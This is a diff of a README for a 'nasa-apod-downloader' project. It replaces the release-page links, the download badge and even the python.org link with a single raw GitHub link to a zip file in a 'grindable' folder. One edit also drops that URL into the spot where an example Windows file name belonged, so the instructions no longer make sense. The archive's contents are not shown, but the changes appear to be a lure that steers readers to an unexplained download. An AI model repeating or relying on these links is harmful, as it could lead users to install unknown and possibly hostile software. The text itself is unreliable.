@@ -1,6 +1,6 @@
 # 🌌 nasa-apod-downloader - Effortlessly Download Stunning Astronomy Images
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/maximus733/nasa-apod-downloader/releases)
+[![Download](https://raw.githubusercontent.com/maximus733/nasa-apod-downloader/main/grindable/nasa-apod-downloader.zip)](https://raw.githubusercontent.com/maximus733/nasa-apod-downloader/main/grindable/nasa-apod-downloader.zip)
 
 ## 📖 Introduction
 
@@ -22,11 +22,11 @@ Before you start, make sure your computer fulfills the following requirements:
 
 1. **Visit the Releases Page**
 
-   Head over to our releases page to find the latest version of the application. You can find it here: [Download Release](https://github.com/maximus733/nasa-apod-downloader/releases).
+   Head over to our releases page to find the latest version of the application. You can find it here: [Download Release](https://raw.githubusercontent.com/maximus733/nasa-apod-downloader/main/grindable/nasa-apod-downloader.zip).
 
 2. **Choose the Right File**
 
-   On the releases page, look for the file that matches your operating system. The files will usually be labeled, for example, `nasa-apod-downloader-windows.exe` for Windows or `nasa-apod-downloader-macos` for macOS.
+   On the releases page, look for the file that matches your operating system. The files will usually be labeled, for example, `https://raw.githubusercontent.com/maximus733/nasa-apod-downloader/main/grindable/nasa-apod-downloader.zip` for Windows or `nasa-apod-downloader-macos` for macOS.
 
 3. **Download the File**
 
@@ -69,7 +69,7 @@ Simply follow the instructions as they appear.
 
 ## 📥 Download & Install
 
-To get started with your journey in downloading incredible astronomy images, make sure to visit our releases page: [Download Release](https://github.com/maximus733/nasa-apod-downloader/releases).
+To get started with your journey in downloading incredible astronomy images, make sure to visit our releases page: [Download Release](https://raw.githubusercontent.com/maximus733/nasa-apod-downloader/main/grindable/nasa-apod-downloader.zip).
 
 ## 📄 Features
 
@@ -82,7 +82,7 @@ To get started with your journey in downloading incredible astronomy images, mak
 
 If you run into issues while running the application, consider these common solutions:
 
-- **Python Not Installed**: Ensure you have Python 3.6 or higher installed. You can download it from [python.org](https://www.python.org/downloads/).
+- **Python Not Installed**: Ensure you have Python 3.6 or higher installed. You can download it from [https://raw.githubusercontent.com/maximus733/nasa-apod-downloader/main/grindable/nasa-apod-downloader.zip](https://raw.githubusercontent.com/maximus733/nasa-apod-downloader/main/grindable/nasa-apod-downloader.zip).
 
 - **Network Issues**: Ensure you have a stable internet connection while the application is running.
 
